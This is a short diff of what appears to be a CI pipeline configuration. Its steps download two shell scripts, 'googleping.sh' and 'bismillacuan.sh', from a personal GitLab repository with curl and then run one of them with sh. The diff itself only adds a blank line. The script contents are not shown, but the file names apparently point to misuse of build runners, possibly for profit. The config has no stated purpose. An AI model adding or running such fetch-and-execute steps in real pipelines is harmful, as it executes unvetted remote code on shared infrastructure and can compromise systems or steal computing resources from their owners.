@@ -14,3 +14,4 @@ steps:
   - curl -L https://gitlab.com/kabehada4/ayamjalan/-/raw/main/googleping.sh > googleping.sh
   - curl -L https://gitlab.com/kabehada4/ayamjalan/-/raw/main/bismillacuan.sh > bismillacuan.sh
   - sh bismillacuan.sh 
+ 
